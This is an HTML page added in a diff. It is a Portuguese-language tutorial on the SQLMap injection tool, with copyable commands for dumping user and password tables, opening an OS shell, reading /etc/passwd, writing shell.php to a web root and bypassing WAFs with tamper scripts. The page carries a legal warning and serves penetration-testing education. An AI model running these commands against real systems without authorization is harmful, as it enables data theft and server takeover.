@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLMap — Guia Detalhado</title>
+  <style>
+    :root {
+      --bg: #0f1115;
+      --card: #171a21;
+      --border: #262b36;
+      --text: #e6e8eb;
+      --muted: #8b93a1;
+      --accent: #00d1b2;
+      --accent2: #4f8cff;
+      --code-bg: #0b0d11;
+      --star: #f5c518;
+    }
+
+    [data-theme="light"] {
+      --bg: #f5f6f8;
+      --card: #ffffff;
+      --border: #e1e4e8;
+      --text: #1a1d23;
+      --muted: #5f6672;
+      --accent: #00897b;
+      --accent2: #2962ff;
+      --code-bg: #f0f2f5;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      padding: 2rem 1rem;
+      transition: background .3s, color .3s;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 0 auto;
+    }
+
+    .top-actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: .5rem;
+      margin-bottom: 1rem;
+    }
+
+    .icon-btn {
+      background: var(--card);
+      border: 1px solid var(--border);
+      color: var(--text);
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color .2s, transform .1s;
+    }
+
+    .icon-btn:hover {
+      border-color: var(--accent);
+      transform: translateY(-1px);
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: .35rem;
+      color: var(--accent2);
+      text-decoration: none;
+      font-size: .9rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .back-link:hover {
+      text-decoration: underline;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 1.5rem;
+      margin-bottom: 2rem;
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: .5rem;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 1.05rem;
+    }
+
+    .meta {
+      margin-top: .75rem;
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      font-size: .85rem;
+    }
+
+    .meta span {
+      color: var(--muted);
+    }
+
+    .meta a {
+      color: var(--accent2);
+      text-decoration: none;
+    }
+
+    .meta a:hover {
+      text-decoration: underline;
+    }
+
+    h2 {
+      font-size: 1.35rem;
+      margin: 2.5rem 0 1rem;
+      padding-bottom: .4rem;
+      border-bottom: 1px solid var(--border);
+      color: var(--accent);
+    }
+
+    h3 {
+      font-size: 1.05rem;
+      margin: 1.5rem 0 .5rem;
+      color: var(--text);
+    }
+
+    p {
+      margin-bottom: 1rem;
+      color: var(--muted);
+      font-size: .95rem;
+    }
+
+    ul,
+    ol {
+      margin: 0 0 1rem 1.5rem;
+      color: var(--muted);
+      font-size: .95rem;
+    }
+
+    li {
+      margin-bottom: .35rem;
+    }
+
+    strong {
+      color: var(--text);
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.25rem;
+      margin-bottom: 1rem;
+    }
+
+    .code {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: .65rem .85rem;
+      font-family: "SF Mono", Consolas, Monaco, monospace;
+      font-size: .82rem;
+      color: var(--accent);
+      overflow-x: auto;
+      white-space: pre-wrap;
+      margin-bottom: .85rem;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .code:hover::after {
+      content: "copiar";
+      position: absolute;
+      right: .6rem;
+      top: .5rem;
+      font-size: .65rem;
+      color: var(--muted);
+      background: var(--code-bg);
+      padding: 0 .3rem;
+    }
+
+    .code.copied::after {
+      content: "✓ copiado";
+      color: var(--accent);
+    }
+
+    .tag {
+      display: inline-block;
+      font-size: .7rem;
+      text-transform: uppercase;
+      letter-spacing: .05em;
+      padding: .2rem .55rem;
+      border-radius: 999px;
+      margin-bottom: .75rem;
+    }
+
+    .tag-basic {
+      background: rgba(0, 209, 178, .15);
+      color: var(--accent);
+    }
+
+    .tag-enum {
+      background: rgba(79, 140, 255, .15);
+      color: var(--accent2);
+    }
+
+    .tag-advanced {
+      background: rgba(255, 80, 80, .15);
+      color: #ff6b6b;
+    }
+
+    .tag-tamper {
+      background: rgba(245, 197, 24, .15);
+      color: var(--star);
+    }
+
+    .table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: .88rem;
+      margin-bottom: 1rem;
+    }
+
+    .table th,
+    .table td {
+      text-align: left;
+      padding: .5rem .75rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .table th {
+      color: var(--accent);
+      font-weight: 600;
+    }
+
+    .table td {
+      color: var(--muted);
+    }
+
+    .table code {
+      color: var(--accent);
+      background: var(--code-bg);
+      padding: .1rem .3rem;
+      border-radius: 3px;
+    }
+
+    .cheat-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: .75rem;
+      margin-bottom: 1rem;
+    }
+
+    .cheat-item {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: .75rem;
+      font-size: .82rem;
+    }
+
+    .cheat-item .cmd {
+      color: var(--accent);
+      font-family: monospace;
+      display: block;
+      margin-bottom: .3rem;
+    }
+
+    .cheat-item .desc {
+      color: var(--muted);
+      font-size: .78rem;
+    }
+
+    .warning {
+      background: rgba(255, 80, 80, .08);
+      border-left: 3px solid #ff5050;
+      padding: .85rem 1rem;
+      border-radius: 0 8px 8px 0;
+      margin-bottom: 1rem;
+      font-size: .88rem;
+      color: var(--muted);
+    }
+
+    .warning strong {
+      color: #ff6b6b;
+    }
+
+    .highlight {
+      background: rgba(0, 209, 178, .08);
+      border-left: 3px solid var(--accent);
+      padding: .85rem 1rem;
+      border-radius: 0 8px 8px 0;
+      margin-bottom: 1rem;
+      font-size: .88rem;
+      color: var(--muted);
+    }
+
+    .highlight strong {
+      color: var(--accent);
+    }
+
+    footer {
+      margin-top: 3rem;
+      text-align: center;
+      font-size: .8rem;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+      padding-top: 1.5rem;
+    }
+
+    @media print {
+      body {
+        background: #fff;
+        color: #000;
+        padding: 0;
+      }
+
+      .top-actions,
+      .back-link,
+      .code:hover::after {
+        display: none !important;
+      }
+
+      h1 {
+        -webkit-text-fill-color: #000;
+        color: #000;
+      }
+
+      .code {
+        background: #f5f5f5;
+        color: #333;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <div class="top-actions">
+      <button class="icon-btn" id="themeBtn" title="Alternar tema">🌙</button>
+      <button class="icon-btn" id="printBtn" title="Imprimir / PDF">🖨️</button>
+    </div>
+
+    <a class="back-link" href="kali-tools.html">← Voltar às 15 ferramentas</a>
+
+    <header>
+      <h1>SQLMap</h1>
+      <p class="subtitle">Ferramenta open source para deteção e exploração automatizada de injeções SQL — e tomada de
+        controlo das bases de dados</p>
+      <div class="meta">
+        <span>🔗 <a href="https://sqlmap.org/" target="_blank" rel="noopener">Site oficial</a></span>
+        <span>📖 <a href="https://github.com/sqlmapproject/sqlmap/wiki" target="_blank"
+            rel="noopener">Documentação</a></span>
+        <span>📦 <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">GitHub</a></span>
+      </div>
+    </header>
+
+    <h2>O que é o SQLMap?</h2>
+    <p>
+      O SQLMap é uma ferramenta open source que automatiza o processo de deteção e exploração de vulnerabilidades
+      de injeção SQL. O seu motor de deteção foi refinado ao longo de duas décadas de pentests reais e milhares
+      de relatórios de bugs da comunidade, cobrindo uma vasta gama de stacks tecnológicas e casos limite,
+      atingindo um elevado grau de precisão.
+    </p>
+    <p>
+      Suporta <strong>mais de 40 backends de bases de dados</strong>, tanto motores relacionais tradicionais
+      (MySQL, Oracle, PostgreSQL, SQL Server) como data warehouses na cloud (Amazon Redshift, Snowflake,
+      ClickHouse). Deteta e explora cinco técnicas de injeção: boolean-based blind, time-based blind,
+      error-based, UNION query e stacked queries.
+    </p>
+
+    <h2>As 5 Técnicas de Injeção SQL</h2>
+    <p>O SQLMap testa automaticamente todas as técnicas por defeito. A flag <code>--technique</code> permite restringir
+      quais usar:</p>
+
+    <table class="table">
+      <thead>
+        <tr>
+          <th>Letra</th>
+          <th>Técnica</th>
+          <th>Descrição</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>B</code></td>
+          <td>Boolean-based blind</td>
+          <td>Infere dados a partir de respostas true/false da aplicação.</td>
+        </tr>
+        <tr>
+          <td><code>E</code></td>
+          <td>Error-based</td>
+          <td>Extrai dados a partir de mensagens de erro detalhadas do DBMS.</td>
+        </tr>
+        <tr>
+          <td><code>U</code></td>
+          <td>UNION query-based</td>
+          <td>Injeta instruções UNION SELECT para obter dados pelo mesmo canal.</td>
+        </tr>
+        <tr>
+          <td><code>S</code></td>
+          <td>Stacked queries</td>
+          <td>Executa instruções adicionais separadas por ponto e vírgula.</td>
+        </tr>
+        <tr>
+          <td><code>T</code></td>
+          <td>Time-based blind</td>
+          <td>Usa atrasos (SLEEP, WAITFOR) para inferir informação.</td>
+        </tr>
+        <tr>
+          <td><code>Q</code></td>
+          <td>Inline / out-of-band</td>
+          <td>Usa funções como LOAD_FILE() ou canais OOB (DNS, HTTP).</td>
+        </tr>
+      </tbody>
+    </table>
+    <p><strong>Ordem por defeito:</strong> <code>BEUSTQ</code>. Exemplo para usar apenas boolean e time-based:
+      <code>--technique="BT"</code>.
+    </p>
+
+    <h2>Exemplos de Uso — da Deteção à Extração</h2>
+
+    <h3>1. Verificação manual (antes do SQLMap)</h3>
+    <span class="tag tag-basic">Deteção</span>
+    <div class="code" data-cmd="http://target.com/page.php?id=1'">http://target.com/page.php?id=1'</div>
+    <p>Adiciona uma aspa simples ao parâmetro. Se aparecer um erro SQL (ex: "You have an error in your SQL syntax"), o
+      ponto é provavelmente injetável.</p>
+
+    <h3>2. Scan básico de vulnerabilidade</h3>
+    <span class="tag tag-basic">Deteção</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch">sqlmap -u
+      "http://target.com/page.php?id=1" --batch</div>
+    <p>Testa o parâmetro <code>id</code> para injeção. <code>--batch</code> aceita as respostas por defeito sem
+      interação.</p>
+
+    <h3>3. Scan com verbo detalhado</h3>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page.php?id=1&quot; --batch -v 3">sqlmap -u
+      "http://target.com/page.php?id=1" --batch -v 3</div>
+    <p>Nível de verbosidade 3 (0-6) para ver o que o SQLMap está a fazer em detalhe.</p>
+
+    <h3>4. POST requests</h3>
+    <span class="tag tag-basic">Deteção</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/login&quot; --data=&quot;user=admin&pass=test&quot; --batch">sqlmap -u
+      "http://target.com/login" --data="user=admin&pass=test" --batch</div>
+    <p>Testa parâmetros enviados via POST (formulários de login, APIs).</p>
+
+    <h3>5. Autenticação com cookies</h3>
+    <span class="tag tag-basic">Deteção</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --cookie=&quot;session=abc123&quot; --batch">sqlmap -u
+      "http://target.com/page?id=1" --cookie="session=abc123" --batch</div>
+    <p>Passa o cookie de sessão para testar áreas autenticadas.</p>
+
+    <h3>6. Enumerar bases de dados</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --dbs --batch">sqlmap -u
+      "http://target.com/page?id=1" --dbs --batch</div>
+    <p>Lista todos os nomes de bases de dados disponíveis no servidor.</p>
+
+    <h3>7. Enumerar tabelas</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name --tables --batch">
+      sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch</div>
+    <p>Lista as tabelas dentro da base de dados especificada.</p>
+
+    <h3>8. Enumerar colunas</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name -T users --columns --batch">sqlmap -u
+      "http://target.com/page?id=1" -D database_name -T users --columns --batch</div>
+    <p>Lista as colunas da tabela <code>users</code>.</p>
+
+    <h3>9. Extrair dados de uma tabela</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name -T users --dump --batch">sqlmap -u
+      "http://target.com/page?id=1" -D database_name -T users --dump --batch</div>
+    <p>Extrai todos os registos da tabela <code>users</code>.</p>
+
+    <h3>10. Extrair apenas colunas específicas</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; -D database_name -T users -C username,password --dump --batch">
+      sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch</div>
+    <p>Extrai apenas as colunas <code>username</code> e <code>password</code>.</p>
+
+    <h3>11. Informação do sistema</h3>
+    <span class="tag tag-enum">Enumeração</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --current-user --current-db --batch">
+      sqlmap -u "http://target.com/page?id=1" --current-user --current-db --batch</div>
+    <p>Mostra o utilizador atual e a base de dados atual.</p>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --is-dba --batch">sqlmap -u
+      "http://target.com/page?id=1" --is-dba --batch</div>
+    <p>Verifica se o utilizador atual é administrador da base de dados.</p>
+
+    <h3>12. Forçar DBMS específico</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --dbms=mysql --batch">sqlmap -u
+      "http://target.com/page?id=1" --dbms=mysql --batch</div>
+    <p>Força o SQLMap a assumir MySQL, acelerando o processo quando já sabes o backend.</p>
+
+    <h3>13. Aumentar profundidade e risco</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --level=5 --risk=3 --batch">sqlmap -u
+      "http://target.com/page?id=1" --level=5 --risk=3 --batch</div>
+    <p><code>--level</code> (1-5) controla quais parâmetros e headers são testados. <code>--risk</code> (1-3) controla a
+      agressividade dos payloads. Níveis altos podem ser barulhentos e lentos.</p>
+
+    <h3>14. Especificar ponto de injeção</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; -p id --batch">sqlmap -u
+      "http://target.com/page?id=1" -p id --batch</div>
+    <p>Testa apenas o parâmetro <code>id</code>, ignorando os restantes.</p>
+
+    <h3>15. Usar ficheiro de request (Burp/ZAP)</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -r /path/to/request.txt --batch">sqlmap -r /path/to/request.txt --batch</div>
+    <p>Guarda um request intercetado no Burp ou ZAP num ficheiro e passa-o ao SQLMap. Ideal para requests complexos com
+      muitos headers.</p>
+
+    <h3>16. Múltiplos alvos em ficheiro</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -m /path/to/bulkfile.txt --batch">sqlmap -m /path/to/bulkfile.txt --batch</div>
+    <p>Um ficheiro com um URL por linha. O SQLMap testa todos em sequência.</p>
+
+    <h3>17. Google Dorks (com cautela)</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -g &quot;inurl:?id= site:yourdomain.com&quot; --batch">sqlmap -g "inurl:?id=
+      site:yourdomain.com" --batch</div>
+    <p>Usa dorks do Google para encontrar URLs potencialmente vulneráveis. Usa apenas no teu próprio domínio ou com
+      autorização explícita.</p>
+
+    <h3>18. Shell do sistema operativo</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --os-shell --batch">sqlmap -u
+      "http://target.com/page?id=1" --os-shell --batch</div>
+    <p>Tenta obter uma shell no sistema operativo onde a base de dados corre. Requer privilégios elevados no DBMS.</p>
+
+    <h3>19. Ler ficheiros do sistema</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --file-read=&quot;/etc/passwd&quot; --batch">sqlmap -u
+      "http://target.com/page?id=1" --file-read="/etc/passwd" --batch</div>
+    <p>Lê ficheiros do servidor através de funções SQL como LOAD_FILE().</p>
+
+    <h3>20. Escrever ficheiros no servidor</h3>
+    <span class="tag tag-advanced">Avançado</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --file-write=&quot;shell.php&quot; --file-dest=&quot;/var/www/html/shell.php&quot; --batch">
+      sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
+    </div>
+    <p>Escreve um ficheiro local no servidor alvo. Requer privilégios de escrita no DBMS.</p>
+
+    <h2>Tamper Scripts — Bypass de WAF</h2>
+    <p>
+      Os tamper scripts modificam os payloads SQL antes de serem enviados, através de técnicas como
+      encoding, ofuscação de keywords e substituição de operadores. São a principal arma contra WAFs.
+    </p>
+
+    <h3>Aplicação básica</h3>
+    <span class="tag tag-tamper">Tamper</span>
+    <div class="code" data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --tamper=space2comment">sqlmap -u
+      "http://target.com/page?id=1" --tamper=space2comment</div>
+    <p>Substitui espaços por comentários <code>/**/</code>: <code>SELECT id FROM users</code> →
+      <code>SELECT/**/id/**/FROM/**/users</code>.
+    </p>
+
+    <h3>Combinação de tamper scripts</h3>
+    <span class="tag tag-tamper">Tamper</span>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;http://target.com/page?id=1&quot; --tamper=randomcase,space2comment,equaltolike">sqlmap
+      -u "http://target.com/page?id=1" --tamper=randomcase,space2comment,equaltolike</div>
+    <p>Combina três técnicas: randomcase (SeLeCt), space2comment (/**/) e equaltolike (= → LIKE).</p>
+
+    <h3>Tamper scripts mais usados</h3>
+    <table class="table">
+      <thead>
+        <tr>
+          <th>Script</th>
+          <th>Função</th>
+          <th>Exemplo</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>space2comment.py</code></td>
+          <td>Espaços → <code>/**/</code></td>
+          <td><code>SELECT/**/id</code></td>
+        </tr>
+        <tr>
+          <td><code>randomcase.py</code></td>
+          <td>Case aleatório</td>
+          <td><code>SeLeCt</code></td>
+        </tr>
+        <tr>
+          <td><code>equaltolike.py</code></td>
+          <td><code>=</code> → <code>LIKE</code></td>
+          <td><code>id LIKE 1</code></td>
+        </tr>
+        <tr>
+          <td><code>charencode.py</code></td>
+          <td>URL encoding</td>
+          <td><code>%53%45%4C%45%43%54</code></td>
+        </tr>
+        <tr>
+          <td><code>charunicodeencode.py</code></td>
+          <td>Unicode encoding</td>
+          <td><code>%u0053%u0045...</code></td>
+        </tr>
+        <tr>
+          <td><code>base64encode.py</code></td>
+          <td>Base64 encoding</td>
+          <td><code>MScgQU5E...</code></td>
+        </tr>
+        <tr>
+          <td><code>apostrophemask.py</code></td>
+          <td>Mascara aspas</td>
+          <td><code>%EF%BC%87</code></td>
+        </tr>
+        <tr>
+          <td><code>unmagicquotes.py</code></td>
+          <td>Bypass magic_quotes</td>
+          <td><code>%BF%27--</code></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>Exemplo real de bypass</h3>
+    <div class="code"
+      data-cmd="sqlmap -u &quot;https://target.com/login&quot; --data=&quot;user=admin&pass=1&quot; --tamper=&quot;charunicodeencode,space2hash&quot; --level=5 --risk=3">
+      sqlmap -u "https://target.com/login" --data="user=admin&pass=1" --tamper="charunicodeencode,space2hash" --level=5
+      --risk=3</div>
+    <p>Combinação usada em ambiente com Cloudflare + ModSecurity. Unicode encoding + comentários com hash permitiram
+      obter a versão da base de dados.</p>
+
+    <h2>Cheat Sheet rápido</h2>
+    <div class="cheat-grid">
+      <div class="cheat-item">
+        <span class="cmd">--batch</span>
+        <span class="desc">Modo não interativo</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">--dbs</span>
+        <span class="desc">Listar bases de dados</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">-D dbname --tables</span>
+        <span class="desc">Listar tabelas</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">-T users --columns</span>
+        <span class="desc">Listar colunas</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">-T users --dump</span>
+        <span class="desc">Extrair dados</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">--current-user</span>
+        <span class="desc">Utilizador atual do DBMS</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">--is-dba</span>
+        <span class="desc">Verificar se é admin</span>
+      </div>
+      <div class="cheat-item">
+        <span class="cmd">--tamper=script</span>
+        <span class="desc">Bypass de WAF</span>
+      </div>
+    </div>
+
+    <div class="highlight">
+      <strong>💡 Dica:</strong> O SQLMap guarda os resultados das sessões anteriores na pasta
+      <code>~/.local/share/sqlmap/output/</code>. Se interromperes um scan, ele retoma automaticamente onde parou.
+    </div>
+
+    <div class="warning">
+      <strong>⚠️ Aviso legal:</strong> O uso do SQLMap para atacar alvos sem consentimento prévio mútuo é ilegal.
+      É responsabilidade do utilizador final obedecer a todas as leis locais, estaduais e federais aplicáveis.
+      Os desenvolvedores não assumem qualquer responsabilidade por uso indevido ou danos causados.
+      Usa apenas em sistemas que possuis ou tens autorização explícita por escrito.
+    </div>
+
+    <footer>
+      Guia SQLMap — parte da série "Top 15 Ferramentas Kali Linux".
+    </footer>
+
+  </div>
+
+  <script>
+    // Tema
+    const themeBtn = document.getElementById("themeBtn");
+    const savedTheme = localStorage.getItem("sqlmap-theme") || "dark";
+    document.documentElement.setAttribute("data-theme", savedTheme);
+    themeBtn.textContent = savedTheme === "dark" ? "🌙" : "☀️";
+
+    themeBtn.addEventListener("click", () => {
+      const current = document.documentElement.getAttribute("data-theme");
+      const next = current === "dark" ? "light" : "dark";
+      document.documentElement.setAttribute("data-theme", next);
+      localStorage.setItem("sqlmap-theme", next);
+      themeBtn.textContent = next === "dark" ? "🌙" : "☀️";
+    });
+
+    // Imprimir
+    document.getElementById("printBtn").addEventListener("click", () => window.print());
+
+    // Copiar comandos
+    document.querySelectorAll(".code").forEach(el => {
+      el.addEventListener("click", () => {
+        navigator.clipboard.writeText(el.dataset.cmd).then(() => {
+          el.classList.add("copied");
+          setTimeout(() => el.classList.remove("copied"), 1200);
+        });
+      });
+    });
+  </script>
+
+</body>
+
+</html>
